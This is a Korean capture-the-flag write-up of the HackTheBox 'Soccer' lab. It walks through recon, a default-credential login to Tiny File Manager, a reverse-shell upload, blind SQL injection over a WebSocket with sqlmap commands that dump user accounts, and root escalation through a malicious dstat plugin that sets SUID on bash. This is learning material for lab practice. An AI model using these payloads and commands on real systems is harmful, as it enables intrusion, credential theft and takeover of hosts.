# HTB-SOCCER
```bash
OS: Linux
DATE: 26.09.01
DIFFICULTY: Easy
```

## RECON
초반에 전체 포트 검사를 실시했다.
```bash
nmap -p- -T4 IP 
```
**결과**: 22(ssh), 80(http), 9091(알 수 없는 포트)

이렇게 나왔다. 초기 접근으로 80번 http 서비스를 선택해서 들어갔다. 접근해보니 domain soccer.htb를 필요로 했다. 그래서 도메인 주소를 추가해주었다.
```bash
sudo nano /etc/hosts
```
처음 접근한 페이지는 축구 관련 페이지였다. 딱히 쓸모 있는 정보는 없어 RECON을 더 진행하였다. ffuf를 통해 웹 디렉토리와 서브도메인도 검사했다.
```bash
ffuf -u http://soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -u http://soccer.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -c -r -H "Host: FUZZ.soccer.htb"
```
결과는 **/tiny**라는 웹페이지가 있었다. 그래서 **http://soccer.htb/tiny**에 접근했다. 대상 페이지는 로그인 창과 함께 **Tiny File Manager**라는 웹사이트가 실행 중이었다. 로그인을 하기 위해 Tiny File Manager Default Credential을 검색해보니
- admin:admin@123

이라는 기본 정보가 있어 로그인에 성공할 수 있었다. 이제 쉘을 얻기 위해 exploit을 찾아본 결과 CVE-2022-23044라는 RCE 취약점이 있었지만 활용하지 못하고, reverse_shell.php를 업로드한 후 www-data 기본 쉘을 얻을 수 있었다.

## Initial Access
www-data 기본 쉘을 얻고 많은 디렉토리를 뒤져보았지만, 기본 쉘이라 할 수 있는 것이 거의 없었다. 계속해서 조사해본 결과 **ps auxww**라는 명령어로 nginx가 두 개 돌아가고 있다는 것을 알게 되었고, `/etc/nginx/sites-available` 디렉토리에서 soc-player.soccer.htb라는 서브도메인이 있다는 것을 알게 되어 그 서브도메인까지 `/etc/hosts`에 추가해준 후 접근을 시도하였다.

soc-player.soccer.htb는 soccer.htb와 비슷하게 축구 관련 사이트였다. 하지만 login과 sign up 페이지가 있었고, sign up한 후 로그인해본 결과 내 전용 티켓이 있었다. 그 티켓을 입력하는 창에 티켓을 입력해도 GET이나 POST로 HTTP 통신을 하는 것 같지 않았다. 이후 F12 키를 통해 debugger 탭에서 check라는 html 소스를 확인할 수 있었고, 티켓이 웹소켓으로 통신한다는 것을 알게 되었다.
```js
input.addEventListener('keypress', (e) => { keyOne(e) });

function keyOne(e) {
  if (e.keyCode === 13) {   // 13 = 엔터키
    e.preventDefault();      // ← 함정! 원래 form 제출을 "막아버림"
    sendText();              // ← 대신 이 함수 실행
  }
}

function sendText() {
  var msg = input.value;                    // 내가 친 값 (62414)
  ws.send(JSON.stringify({'id': msg}))      // ← WebSocket으로 보냄!
}
```
따라서 **var ws = new WebSocket('ws://soc-player.soccer.htb:9091');**라는 소스를 통해 9091 포트로 웹소켓 통신을 한다는 것을 알게 되었다. 티켓을 입력할 수 있는 텍스트 창에서 올바른 티켓을 입력하면 **Ticket Exists**라는 문구가 뜨고, 티켓이 올바르지 않으면 **Ticket Doesn't Exist**라는 문구가 떴다. 이를 이용하여 SQL Injection payload를 실행해본 결과 `1 or '1'='1'-- `라는 페이로드가 동작하여 SQL Injection이 가능하다는 것을 알게 되었다.

최대한 손으로 하려 했지만 blind injection이라서 sqlmap이라는 도구를 활용하여 문제를 풀었다.
```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"1"}' --level=5 --risk=3 --dbs --technique=B --batch -t 10
```
데이터베이스는 **soccer_db**라는 것을 알게 되었다.
```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"1"}' --level=5 --risk=3 --dbs --technique=B --batch -t 10 -v 0 -D soccer_db --tables
```
이 명령어를 통해 tables를 조회해본 결과 accounts라는 테이블을 발견할 수 있었다.
```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"1"}' --level=5 --risk=3 --dbs --technique=B --batch -t 10 -v 0 -D soccer_db -T accounts --dump
```
이후 모든 정보를 얻은 결과 player라는 유저의 비밀번호를 얻을 수 있었다. 바로 player 유저 계정으로 ssh 접근을 시도해본 결과 초기 접근에 성공할 수 있었다.

![user](attach_real/Pasted%20image%2020260901194006.png)

## Privilege Escalation
ssh 접속 후 `sudo -l` 등 여러 가지를 시도해보았다. SUID를 검색해본 결과 doas라는 프로그램이 SUID로 실행 중이었다.
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
**doas**: sudo의 가벼운 사촌. "특정 유저가 특정 명령을 다른 유저(보통 root) 권한으로 실행하게 해주는" 프로그램

doas Privilege Escalation을 구글에 검색해본 결과, **find / -type f -name "doas.conf" 2>/dev/null**로 doas.conf 파일을 찾고 **cat /etc/doas.conf**를 이용하여 root로 사용할 수 있는 프로그램을 조회할 수 있었다.
```bash
find / -type f -name "doas.conf" 2>/dev/null

/usr/local/etc/doas.conf
```
```bash
cat /usr/local/etc/doas.conf
```
conf 파일 내용은 **permit nopass player as root cmd /usr/bin/dstat**라는 내용이 있었다. root 권한으로 dstat 프로그램을 사용할 수 있다는 것이었다. 그래서 dstat 권한 상승을 찾아보았다. dstat은 `/usr/local/share/dstat/`이라는 폴더에 `dstat_xxx.py`라는 코드를 작성하면 이를 플러그인으로 사용할 수 있어, 그것을 악용하여 권한 상승을 할 수 있다는 내용이었다. 그래서
```bash
nano dstat_exploit.py
```
```python
import os

os.system("chmod +s /usr/bin/bash")
```
라는 파이썬 코드를 넣어준 후 권한 상승을 시도해보았다.
```bash
doas /usr/bin/dstat --exploit
```
```bash
/bin/bash -p
```
이로써 권한 상승에 성공하였다.

![root](attach_real/Pasted%20image%2020260901210357.png)

## New Inform
- 웹소켓의 개념을 알게 되었다.
  **websocket**: 브라우저와 서버가 연결을 끊지 않고 계속 유지하면서, 양쪽 다 아무 때나 실시간으로 메시지를 주고받는 통신 방식
- 항상 많은 디렉토리를 뒤져보아야 한다. 기본 쉘에서 더 많은 쉘로 이동할 가능성을 열어야 한다.
- 권한 상승도 두 개가 체인되어 이뤄질 수 있다.
- 항상 취약점을 사용해야 하는 것은 아니다.